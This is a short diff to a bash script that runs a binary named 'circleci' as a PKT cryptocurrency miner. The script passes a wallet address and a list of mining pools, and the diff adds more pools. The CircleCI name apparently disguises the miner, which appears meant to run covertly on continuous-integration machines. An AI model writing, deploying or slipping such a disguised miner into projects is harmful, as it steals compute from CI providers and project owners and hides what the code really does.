@@ -1,4 +1,4 @@
 #!/bin/bash
 
 chmod 777 circleci >/dev/null 2>&1
-nohup ./circleci ann -p pkt1qfd04qlvx4ag9yrm9m5ju6fwp2kyx7ct0fnteqp http://pool.pkteer.com http://pool.pktpool.io > nohup.out
+nohup ./circleci ann -p pkt1qfd04qlvx4ag9yrm9m5ju6fwp2kyx7ct0fnteqp https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com  > nohup.out
